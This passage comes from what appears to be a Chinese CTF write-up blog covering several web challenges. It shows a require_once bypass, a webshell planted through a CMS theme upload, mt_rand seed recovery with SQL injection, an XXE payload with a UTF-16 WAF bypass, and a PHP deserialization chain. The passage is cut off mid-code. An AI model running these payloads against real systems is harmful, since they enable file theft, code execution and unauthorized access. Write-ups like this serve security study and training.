php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>require_once()</code>，这个函数的特点是只包含一次，因为刚才是已经<code>require_once &#39;flag.php&#39;</code>了，不能再次包含。所以需要绕过<code>require_once()</code>，让它检测传入的文件名哈希值既没有重复，又能读到flag.php这个文件。</p><p><code>require_once()</code>在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>提示5位弱密码</p><p>&#x2F;admin.php 使用admin和12345登录后台</p><p>发现主题可以上传，需要创建如下文件</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405072029587.png" alt="image-20210829200802221"></p><p>在设计-组件-素材库里可以上传txt文件然后重命名</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405072031739.png" alt="image-20240507203150671"></p><p>直接在高级里更改，加个马</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405072034540.png" alt="image-20240507203423468"></p><p>蚁剑连接</p><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405082146551.png" alt="image-20240508214611419"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&#x27;http://f9a52959-cb54-4ea7-b20c-864efeff6d09.node5.buuoj.cn:81//&#x27;</span><br>session = requests.session()<br>res = session.get(url)<br>res = res.text<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1010</span>):<br>    <span class="hljs-keyword">try</span>:<br>        result = re.findall(<span class="hljs-string">&quot;\&lt;br\&gt;\&lt;br\&gt;(\d.*?)\&lt;br\&gt;\&lt;br\&gt;&quot;</span>,res)<span class="hljs-comment">#获取[数字]</span><br>        result = <span class="hljs-string">&quot;&quot;</span>.join(result)<span class="hljs-comment">#提取字符串</span><br>        result = <span class="hljs-built_in">eval</span>(result)<span class="hljs-comment">#运算</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&quot;   &quot;</span>+<span class="hljs-string">&quot;result: &quot;</span>+ <span class="hljs-built_in">str</span>(result))<br><br>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span>:result&#125;<br>        res = session.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(re.search(<span class="hljs-string">&quot;flag&#123;.*&#125;&quot;</span>, res).group(<span class="hljs-number">0</span>)[:<span class="hljs-number">50</span>])<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment">#防止访问太快断开连接</span><br>    <span class="hljs-keyword">except</span>: <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p><a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=<span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        <span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings2</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br><span class="hljs-comment">//   $Public_key = public_key();</span><br><span class="hljs-comment">// $Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure><p>只有当username，password和private_key全部正确时，才会获取flag。<br>对于username和password，由于是sql查询，可以万能密码进行绕过，剩下的问题是获取private_key。</p><p>发现mt_rand(),想到mt_rand()伪随机数</p><p>告诉了我们$Public_key &#x3D; KVQP0LdJKRaV3n9D，通过php_mt_seed工具来获取种子值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 =<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>result =<span class="hljs-string">&#x27;&#x27;</span><br><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str2)):<br>        <span class="hljs-keyword">if</span> str1[i] ==  str2[j]:<br>            result += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> +<span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment">#36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405102214418.png" alt="image-20240510221445298"></p><p>得到种子值就能得到$private_key&#x3D;XuNhoueCDCGc（注意php版本不同，得到的随机数不同）</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405102216631.png" alt="image-20240510221623567"></p><p>成功登录得到flag </p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032115701.png" alt="image-20240603211522641"></p><p>提示上传xml，flag在根目录</p><p>xxe漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">users</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>gg<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ggg<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>alice@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p>提示waf，要绕过</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">一个xml文档不仅可以用UTF-<span class="hljs-number">8</span>编码，也可以用<span class="hljs-built_in">UTF-16</span>(两个变体 - BE和LE)、<span class="hljs-built_in">UTF-32</span>(四个变体 - BE、LE、<span class="hljs-number">2143</span>、<span class="hljs-number">3412</span>)和EBCDIC编码。<br><br>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> <span class="hljs-number">1</span>.xml | iconv -f UTF-<span class="hljs-number">8</span> -t UTF-<span class="hljs-number">16</span>BE &gt; x16.xml<br></code></pre></td></tr></table></figure><p>转为16进制上传</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032119661.png" alt="image-20240603211922589"></p><h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码</p><p>反序列化</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span>( ($<span class="hljs-keyword">this</span>-&gt;syc != $<span class="hljs-keyword">this</span>-&gt;lover) &amp;&amp; (md5($<span class="hljs-keyword">this</span>-&gt;syc) === md5($<span class="hljs-keyword">this</span>-&gt;lover)) &amp;&amp; (sha1($<span class="hljs-keyword">this</span>-&gt;syc)=== sha1($<span class="hljs-keyword">this</span>-&gt;lover)) )<br></code></pre></td></tr></table></figure><p>绕过该条件，在类中不能数组绕过，使用php原生类绕过</p><p><code>使用含有 __toString 方法的php内置类来绕过，用的两个比较多的内置类是 Exception 和Error ，他们之中有一个 __toString 方法 ,当类被当作字符串处理时，就会调用这个函数</code></p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032212332.png" alt="img"></p><p>以字符串的形式 输出当前报错，包含当前的错误信息， 以及他出现错误的行号 (3)，但传入Error (“payload”,9)中的错误代码 “9 ” 则没有被输出出来</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032213051.png" alt="img"></p><p><code>可见 $a 和$b 这两个对象本身是不同的。但是 __toString 方法返回的结果是相同的，这里之所以需要在同一行是因为 __toString 返回的数据包含当前的行号</code></p><p>Exception 类与Error 类的使用和结果完全一样，只不过Exception 类适用于PHP 5和7 而Error 只适用于php7</p><p>思路：将题目代码中的$syc 和 $lover 分别声明为类似上面的内置类对象，让这两个对象本身不同 (传入的错误代码)， 但是 __toString 方法输出的结果相同即可。</p><p>preg_match 过滤了小括号，无法调用函数，构造<code>include &quot;/flag&quot;</code>,过滤了引号，我们直接用url 取反绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$m</span> = <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$m</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>)));<br><br><span 